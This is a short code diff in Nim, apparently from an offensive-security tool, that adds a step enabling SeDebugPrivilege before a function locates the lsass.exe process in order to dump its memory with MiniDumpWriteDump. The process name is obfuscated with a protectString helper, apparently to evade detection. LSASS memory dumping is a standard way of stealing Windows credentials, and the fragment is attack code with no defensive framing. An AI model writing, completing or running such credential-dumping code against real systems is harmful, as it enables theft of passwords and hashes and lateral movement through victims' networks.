@@ -1,4 +1,5 @@
 import helpers
+import priv
 import winim
 import nimprotect
 
@@ -15,6 +16,9 @@ proc MiniDumpWriteDump(
 
 proc dump_lsass_minidumpwritedump*(): bool =
     var is_success = false
+    # set debug privileges
+    if not set_privilege("SeDebugPrivilege"):
+        return is_success
     let pid = get_pid(protectString("lsass.exe"))
     if not bool(pid):
         return is_success
